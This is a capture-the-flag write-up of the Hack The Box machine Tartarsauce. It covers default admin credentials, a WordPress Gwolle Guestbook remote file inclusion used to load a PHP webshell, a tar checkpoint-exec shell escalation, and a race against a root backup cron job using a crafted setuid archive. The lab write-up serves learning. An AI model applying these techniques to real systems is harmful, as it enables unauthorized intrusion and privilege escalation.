---
title: "Hack The Box - Tartarsauce"
tags: [linux,medium,wordpress,RFI,tar,gtfobins,bash script,gtfobins]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%201.png)

## Enumerating Web :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%202.png)

→ Only the `monstra 3.0.4` is working from the list.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%203.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%204.png)

→ Logged in with admin : admin

⇒ We tried couple of exploits and none worked. When running gobuster on `/webservices` we found wordpress directory :

[http://10.10.10.88/webservices/wp/](http://10.10.10.88/webservices/wp/)

→ After running wpscan we find the following plugin :

**`Gwolle Guestbook 1.5.3`**

→ Found RFI Exploit : [https://www.exploit-db.com/exploits/38861](https://www.exploit-db.com/exploits/38861)

⇒ We hosted php webshell and accessed it through RFI :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%205.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%206.png)

→ We can run tar as onuma user :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%207.png)

**`sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%208.png)

## Privilege Escalation to root

→ After running pspy we discover an cronjob running **`/bin/bash /usr/sbin/backuperer`**

→ Code of **`/usr/sbin/backuperer`**

```bash
#!/bin/bash                                                                                                                                                                     
                                                                                                                                                                                
#-------------------------------------------------------------------------------------                                                                                          
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ                                                                                                                                             
# ONUMA Dev auto backup program                                                                                                                                                 
# This tool will keep our webapp backed up incase another skiddie defaces us again.                                                                                             
# We will be able to quickly restore from a backup in seconds ;P                                                                                                                
#-------------------------------------------------------------------------------------                                                                                          
                                                                                                                                                                                
# Set Vars Here                                                                                                                                                                 
basedir=/var/www/html                                                                                                                                                           
bkpdir=/var/backups                                                                                                                                                             
tmpdir=/var/tmp                                                                                                                                                                 
testmsg=$bkpdir/onuma_backup_test.txt                                                                                                                                           
errormsg=$bkpdir/onuma_backup_error.txt                                                                                                                                         
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)                                                                                                     
check=$tmpdir/check                                                                    
                                                                                       
# formatting                                                                           
printbdr()                                                                             
{                                                                                      
    for n in $(seq 72);                                                                
    do /usr/bin/printf $"-";                                                           
    done                                                                               
}                                           
bdr=$(printbdr)                                                                        
                                                                                       
# Added a test file to let us see when the last backup was run                          
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
                                           
# Cleanup from last time.    
/bin/rm -rf $tmpdir/.* $check               

# Backup onuma website dev files.           
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &                               

# Added delay to wait for backup to complete if large files get added.                  
/bin/sleep 30                               

# Test the backup integrity                 
integrity_chk()                             
{                                           
    /usr/bin/diff -r $basedir $check$basedir                                            
}                                           

/bin/mkdir $check                           
/bin/tar -zxvf $tmpfile -C $check           
if [[ $(integrity_chk) ]]                   
then                                        
    # Report errors so the dev can investigate the issue.                               
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg              
    exit 2                                  
else                                        
    # Clean up and save archive to the bkpdir.                                          
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak                                          
    /bin/rm -rf $check .*                   
    exit 0                                  
fi
```

**⇒ Breaking down the script**

→ These are just the variables containing directories path

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%209.png)

→ This removes the tmpfile from /var/tmp folder :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2010.png)

→ It tars the /var/www/html file as user onuma and saves it in /var/tmp folder with tmpfile name.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2011.png)

→ It sleeps for 30seconds to let the tar process complete

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2012.png)

→ Now it checks whether the backup file created in **`/var/tmp`** is same as **`/var/www/html`** folder.

→ It creates an directory **`/var/tmp/check`**

→ Then untars the backup ( tmpfile) that was created in **`/var/tmp/`** to **`/var/tmp/check/`** 

→ Then it checks if there's any difference between the files in **`/var/tmp/check/`** and **`/var/www/html`** :

- If there is no error it deletes the files in **`/var/tmp/check`**
- If there is a error it leaves the files there.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2013.png)

### Exploiting the cronjob

→ We will create a tar file containing an malicious file that when executed will give us shell as root.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2014.png)

`gcc -m32 enox.c -o enox`

`chmod 4755 enox`

Created folders var/www/html and placed our malicious file in the last directory 

**`tar -zcvf based var/`**

→ Downloaded the file to the box to /var/tmp folder [ As this is where the tmpfile is created ]

→ Now we wait for the cron to be triggered and when the tmpfile is created we will replace its contents with our malicious file. We are able to do this because it sleeps for 30seconds and it is created as onuma user.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2015.png)

→ Now we wait for check directory to be created :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Tartarsauce%20Box%2084cb3638ded749ddb41961e897926939/Untitled%2016.png)

**ROOTED**
